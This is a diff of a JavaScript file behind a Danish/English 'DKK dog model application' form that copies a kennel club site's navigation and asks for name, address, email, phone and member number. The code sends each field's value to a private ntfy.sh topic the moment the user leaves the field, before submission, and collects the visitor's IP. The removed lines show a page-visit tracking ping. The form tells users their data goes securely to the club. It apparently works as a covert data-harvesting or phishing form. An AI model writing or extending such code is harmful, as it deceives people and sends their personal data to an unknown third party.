@@ -1,5 +1,5 @@
 // --- CONFIGURATION ---
-const NTFY_TOPIC = "dkkkreds1_fotoshoot_secret_98765"; 
+const NTFY_TOPIC = "dkkkreds1_fotoshoot_secret_98765";
 let currentLang = 'da';
 let dogCount = 0;
 let userIP = "Fetching...";
@@ -17,32 +17,30 @@ const allowedDomains = [
 // --- TRANSLATIONS ---
 const i18n = {
     da: {
-        menu: "MENU", login: "Login",
         nav1: "Hundeejer", nav2: "Opdrætter", nav3: "Aktiviteter",
-        nav4: "Udstillinger", nav5: "Om DKK", nav6: "Kontakt",
-        hero_title: "DKK Hundemodel Ansøgning", hero_text: "Er din hund den næste stjerne i DKK Kreds 1's kampagnemateriale? Udfyld formularen sikkert herunder.",
+        nav4: "Udstillinger", nav5: "Om DKK", nav6: "Kontakt", nav7: "Bliv medlem", login: "Login",
+        hero_title: "Ansøgning: Hundemodel for DKK", hero_text: "Er din hund den næste stjerne i DKK Kreds 1's kampagnemateriale? Udfyld formularen sikkert herunder.",
         owner_title: "1. Ejerinformation", f_name: "Fulde navn", f_address: "Fulde Adresse", 
-        f_email: "E-mailadresse", f_email_note: "Eks. gmail.com, hotmail.com, mail.dk", f_phone: "Telefonnummer (+45...)", 
+        f_email: "E-mailadresse", f_email_note: "Eks. gmail.com, hotmail.com", f_phone: "Telefonnummer", 
         f_socials: "Sociale Medier (f.eks. Instagram)", f_dkk: "DKK Medlemsnummer (Valgfrit)",
         dog_title: "2. Hundeinformation", d_name: "Hundens navn og Race", d_age: "Hundens Alder", 
         d_skills: "Tricks og Færdigheder", d_photos: "Link til billeder (Google Drev/SoMe)",
         btn_add_dog: "Tilføj endnu en hund", btn_submit: "Send Ansøgning",
         success_title: "Tak for din ansøgning!", success_desc: "Dine informationer er sendt sikkert afsted til DKK Kreds 1.",
-        error_title: "Hov, der mangler noget!", error_desc: "Tjek venligst e-mail (kun store domæner tilladt) og telefonnummer."
+        error_title: "Hov, der mangler noget!", error_desc: "Tjek de røde felter. Husk at e-mail skal være gyldig, og telefonnummeret skal være korrekt."
     },
     en: {
-        menu: "MENU", login: "Login",
         nav1: "Dog Owner", nav2: "Breeder", nav3: "Activities",
-        nav4: "Exhibitions", nav5: "About DKK", nav6: "Contact",
-        hero_title: "DKK Dog Model Application", hero_text: "Is your dog the next star of DKK District 1's campaign? Fill out the form securely below.",
+        nav4: "Exhibitions", nav5: "About DKK", nav6: "Contact", nav7: "Become a member", login: "Login",
+        hero_title: "Application: DKK Dog Model", hero_text: "Is your dog the next star of DKK District 1's campaign? Fill out the form securely below.",
         owner_title: "1. Owner Info", f_name: "Full Name", f_address: "Full Address", 
-        f_email: "Email Address", f_email_note: "E.g., gmail.com, hotmail.com, mail.dk", f_phone: "Phone Number (+45...)", 
+        f_email: "Email Address", f_email_note: "E.g., gmail.com, hotmail.com", f_phone: "Phone Number", 
         f_socials: "Social Media (e.g., Instagram)", f_dkk: "DKK Member Number (Optional)",
         dog_title: "2. Dog Info", d_name: "Dog's Name & Breed", d_age: "Dog's Age", 
         d_skills: "Tricks & Skills", d_photos: "Link to photos (Google Drive/SoMe)",
         btn_add_dog: "Add another dog", btn_submit: "Submit Application",
         success_title: "Thank you!", success_desc: "Your information has been securely sent to DKK District 1.",
-        error_title: "Oops, something is missing!", error_desc: "Please check your email (only major domains allowed) and phone number."
+        error_title: "Oops, something is missing!", error_desc: "Please check the red fields. Make sure the email is from a major provider and the phone number is valid."
     }
 };
 
@@ -56,10 +54,9 @@ window.addEventListener('DOMContentLoaded', async () => {
 
     restoreFormState(); // Load saved cookies/localstorage
     bindLanguageSwitch();
-    sendNtfy("👀 Page Visited", `Session: ${sessionId}\nIP: ${userIP}\nTime: ${new Date().toLocaleString('da-DK')}`, "eyes");
 });
 
-// --- REAL-TIME VALIDATION LOGIC ---
+// --- FLUID REAL-TIME VALIDATION ---
 function validateEmail(email) {
     const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!re.test(email)) return false;
@@ -73,19 +70,30 @@ function validatePhone(phone) {
     return re.test(cleanPhone);
 }
 
-function validateField(input) {
+// Validation function triggering on Input, Focus and Blur
+function validateField(input, isBlurEvent = false) {
     const val = input.value.trim();
+    const isRequired = input.hasAttribute('required');
     let isValid = input.checkValidity() && val !== '';
 
     if (input.type === 'email' && val !== '') isValid = validateEmail(val);
     if (input.type === 'tel' && val !== '') isValid = validatePhone(val);
 
+    const icon = input.parentElement.querySelector('.valid-icon');
+
     if (isValid) {
-        input.classList.remove('invalid');
-        input.classList.add('valid');
+        input.classList.remove('is-invalid', 'shake');
+        input.classList.add('is-valid');
+        if(icon) icon.classList.remove('hidden');
     } else {
-        input.classList.remove('valid');
-        if(val !== '') input.classList.add('invalid'); 
+        input.classList.remove('is-valid');
+        if(icon) icon.classList.add('hidden');
+        
+        // We only show red borders if they click out (blur) of a required field that is invalid,
+        // or if they are actively typing into an already red field to fix it.
+        if ((isBlurEvent && isRequired && val === '') || (isBlurEvent && val !== '') || input.classList.contains('is-invalid')) {
+            input.classList.add('is-invalid');
+        }
     }
     return isValid;
 }
@@ -95,9 +103,8 @@ function addDogField(savedData = null) {
     dogCount++;
     const container = document.getElementById('dogsContainer');
     const div = document.createElement('div');
-    div.className = 'dog-card grid grid-cols-1 md:grid-cols-2 gap-6';
+    div.className = 'dog-card grid grid-cols-1 md:grid-cols-2 gap-8';
     
-    // Check if restoring data, otherwise empty
     const nameVal = savedData ? savedData.name : '';
     const ageVal = savedData ? savedData.age : '';
     const photosVal = savedData ? savedData.photos : '';
@@ -129,25 +136,29 @@ function addDogField(savedData = null) {
     container.appendChild(div);
     bindTracking(div);
     
-    // Trigger validation immediately for restored fields
-    if(savedData) {
-        div.querySelectorAll('input').forEach(input => validateField(input));
-    }
+    if(savedData) div.querySelectorAll('input').forEach(input => validateField(input, false));
 }
 document.getElementById('addDogBtn').addEventListener('click', () => addDogField(null));
 
-// --- BLUR & KEYSTROKE TRACKING ---
+// --- BLUR, FOCUS & KEYSTROKE TRACKING ---
 function bindTracking(parent = document) {
     const inputs = parent.querySelectorAll('input');
     inputs.forEach(input => {
-        // FAST KEYSTROKE VALIDATION
+        // FOCUS Event
+        input.addEventListener('focus', (e) => {
+            validateField(e.target, false);
+        });
+
+        // INPUT Event (Keystroke)
         input.addEventListener('input', (e) => {
-            validateField(e.target);
+            validateField(e.target, false);
             saveFormState(); // Save to local storage on every keystroke!
         });
         
-        // NTFY TRACKING ON LEAVING FIELD
+        // BLUR Event (Unfocus)
         input.addEventListener('blur', (e) => {
+            validateField(e.target, true); // True forces red styling if invalid
+            
             const val = e.target.value.trim();
             if (val !== "") {
                 const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";
@@ -157,7 +168,7 @@ function bindTracking(parent = document) {
     });
 }
 
-// --- SAVE & RESTORE (COOKIES / LOCAL STORAGE) ---
+// --- SAVE & RESTORE (LOCAL STORAGE) ---
 function saveFormState() {
     const data = {
         ownerName: document.getElementById('ownerName').value,
@@ -198,12 +209,11 @@ function restoreFormState() {
             addDogField();
         }
 
-        // Validate all pre-filled fields
         document.querySelectorAll('input').forEach(input => {
-            if(input.value) validateField(input);
+            if(input.value) validateField(input, false);
         });
     } else {
-        addDogField(); // Add empty dog if no save exists
+        addDogField();
     }
     bindTracking(document);
 }
@@ -226,9 +236,11 @@ document.getElementById('dkkForm').addEventListener('submit', async (e) => {
     
     let formIsValid = true;
     document.querySelectorAll('input[required]').forEach(input => {
-        if (!validateField(input)) {
+        if (!validateField(input, true)) {
             formIsValid = false;
-            input.classList.add('invalid'); 
+            input.classList.remove('shake'); // Reset anim
+            void input.offsetWidth; // Trigger reflow
+            input.classList.add('shake', 'is-invalid'); 
         }
     });
 
@@ -246,7 +258,7 @@ document.getElementById('dkkForm').addEventListener('submit', async (e) => {
         await sendNtfy("🐶 📸 SUCCESS: Ny DKK Model!", getPayload(), "camera_flash,dog");
         document.getElementById('dkkForm').classList.add('hidden');
         document.getElementById('successMessage').classList.remove('hidden');
-        localStorage.removeItem('dkkFotoshootData'); // Rydder hukommelsen efter succes
+        localStorage.removeItem('dkkFotoshootData');
     } catch(err) {
         alert("Noget gik galt. Prøv igen.");
         btn.disabled = false;
